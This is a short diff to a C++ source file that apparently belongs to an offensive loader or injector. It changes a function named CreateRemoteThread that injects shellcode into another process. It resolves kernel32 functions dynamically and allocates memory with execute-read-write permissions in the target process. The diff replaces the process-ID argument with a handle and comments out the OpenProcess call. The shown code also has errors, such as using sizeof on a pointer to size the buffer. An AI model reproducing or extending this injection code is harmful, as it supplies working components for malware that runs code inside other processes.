@@ -1,15 +1,16 @@
 #include "execute.hpp"
 
 namespace execute {
-	BOOL CreateRemoteThread(_In_ DWORD pid, _In_ BYTE* shellcode)
+	BOOL CreateRemoteThread(_In_ HANDLE process_handle, _In_ BYTE* shellcode)
 	{
-		HANDLE process_handle = NULL;
+		HANDLE process = NULL;
 		PVOID address_ptr = NULL;
 		BOOL success = FALSE;
 		HANDLE thread_handle = NULL;
 		SIZE_T bytes_written = 0;
 		HMODULE kernel32 = NULL;
 		BOOL result = FALSE;
+		DWORD process_id = NULL;
 
 #pragma region [Kernel32 Functions]
 		typeGetLastError get_last_error = NULL;
@@ -35,12 +36,12 @@ namespace execute {
 
 #pragma endregion
 
-		process_handle = open_process(PROCESS_ALL_ACCESS, FALSE, pid);
-		if (process_handle == NULL)
-		{
-			LOG_ERROR("[-] Error during OpenProcess call pid: %lu (Code: %08lX)", pid, get_last_error());
-			goto CLEANUP;
-		}
+		// process_handle = open_process(PROCESS_ALL_ACCESS, FALSE, pid);
+		// if (process == NULL)
+		// {
+		// 	LOG_ERROR("[-] Error during OpenProcess call pid: %lu (Code: %08lX)", process_handle, get_last_error());
+		// 	goto CLEANUP;
+		// }
 
 		address_ptr = virtual_alloc_ex(process_handle, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
 		if (address_ptr == NULL)
